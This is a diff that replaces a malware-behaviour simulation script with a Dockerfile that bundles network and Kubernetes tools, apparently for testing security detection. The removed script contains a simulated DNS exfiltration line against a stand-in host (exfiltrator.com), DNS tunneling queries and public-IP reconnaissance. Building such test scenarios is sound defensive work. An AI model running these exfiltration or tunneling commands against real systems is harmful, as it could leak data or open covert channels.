@@ -1,59 +1,63 @@
-#!/bin/bash
+# Stage 1: Builder - Installs tools and dependencies
+FROM ubuntu:22.04 AS builder
 
-# ================================
-# Scenario: Malicious DNS Lookup & Public IP Reconnaissance
-# Author: toquiwokey
-# Type: Network
-# Description:
-# - Simulates malware querying external DNS services to determine its 
-#   public IP address or contact a C2 (Command & Control) server.
-# - Uses a combination of public IP checkers and a safe test domain 
-#   (malware.testing.google.test) to mimic real-world malware behavior.
-# - Security agents should detect:
-#   - Unexpected outbound DNS queries
-#   - Suspicious HTTP/S requests to known reconnaissance services
-#   - Potential DNS tunneling or exfiltration attempts
-# ================================
+# Install necessary tools and clean up
+RUN apt-get update && apt-get install -y --no-install-recommends \
+        curl \
+        nmap \
+        wget \
+        gcc \
+        tcpdump \
+        netcat \
+        telnet \
+        file \
+        dnsutils \
+        iputils-ping \
+    && rm -rf /var/lib/apt/lists/*  # Reduce image size by removing cached APT files
 
-# 📂 Define Log Directory & File
-LOG_DIR="/var/log/nastycontainer/dns_recon"
-LOG_FILE="$LOG_DIR/dns_recon.log"
+# Securely install kubectl (FIXED SHA256 CHECK)
+ARG KUBECTL_VERSION
+RUN set -e && \
+    KUBECTL_VERSION=$(curl -L -s https://dl.k8s.io/release/stable.txt) && \
+    curl -LO "https://dl.k8s.io/release/${KUBECTL_VERSION}/bin/linux/amd64/kubectl" && \
+    curl -LO "https://dl.k8s.io/${KUBECTL_VERSION}/bin/linux/amd64/kubectl.sha256" && \
+    echo "$(cat kubectl.sha256)  kubectl" | sha256sum --check --status || (echo "SHA256 checksum failed!" && exit 1) && \
+    chmod +x kubectl && \
+    mv kubectl /usr/local/bin/ && \
+    rm -f kubectl.sha256
 
-# 🏗 Ensure the log directory exists
-mkdir -p "$LOG_DIR"
+# Copy application scripts
+COPY app /app
 
-# 📝 Redirect all stdout & stderr to both the log file and console
-exec > >(tee -a "$LOG_FILE") 2>&1
+# Ensure scripts are executable
+RUN chmod -R +x /app
 
-echo "===== Starting Malicious DNS & Network Recon Scenario ====="
+# Stage 2: Final Image - Includes all necessary tools
+FROM ubuntu:22.04
 
-# 1️⃣ Public IP Reconnaissance (Simulates malware fingerprinting its external IP)
-echo "[INFO] Checking public IP..."
-echo "[INFO] Querying icanhazip.com..."
-curl -s http://icanhazip.com
-echo "[INFO] Querying checkip.amazonaws.com..."
-curl -s http://checkip.amazonaws.com
-echo "[INFO] Querying ifconfig.me..."
-wget -qO- http://ifconfig.me
-echo "[INFO] Querying OpenDNS Resolver..."
-dig +short myip.opendns.com @resolver1.opendns.com
+# Install all required runtime dependencies
+RUN apt-get update && apt-get install -y --no-install-recommends \
+        curl \
+        nmap \
+        wget \
+        gcc \
+        tcpdump \
+        netcat \
+        telnet \
+        file \
+        dnsutils \
+        iputils-ping \
+    && rm -rf /var/lib/apt/lists/*  # Reduce image size by removing cached APT files
 
-# 2️⃣ DNS Query to Safe Google Malware Test Domain
-echo "[INFO] Querying Google's safe malware test domain..."
-nslookup malware.testing.google.test
-dig @8.8.8.8 malware.testing.google.test
+# Copy necessary files from the builder stage
+COPY --from=builder /usr/local/bin/kubectl /usr/local/bin/kubectl
+COPY --from=builder /app /app
 
-# 3️⃣ DNS Exfiltration Simulation (Mimics malware stealing data over DNS)
-echo "[INFO] Simulating DNS exfiltration..."
-dig exampledata123.exfiltrator.com @8.8.8.8
+# Ensure scripts remain executable
+RUN chmod -R +x /app && \
+    mkdir -p /var/log
 
-# 4️⃣ DNS Tunneling Attempt (Mimics covert C2 communication)
-echo "[INFO] Simulating DNS tunneling..."
-for i in {1..5}; do 
-    DIG_QUERY=$(openssl rand -hex 6).malware.testing.google.test
-    echo "[INFO] Querying: $DIG_QUERY"
-    dig "$DIG_QUERY" @8.8.8.8
-done
+# Set the entry point to run the scenarios script
+ENTRYPOINT ["/app/entrypoint.sh"]
 
-echo "===== Scenario Completed, Logs Saved to $LOG_FILE ====="
 
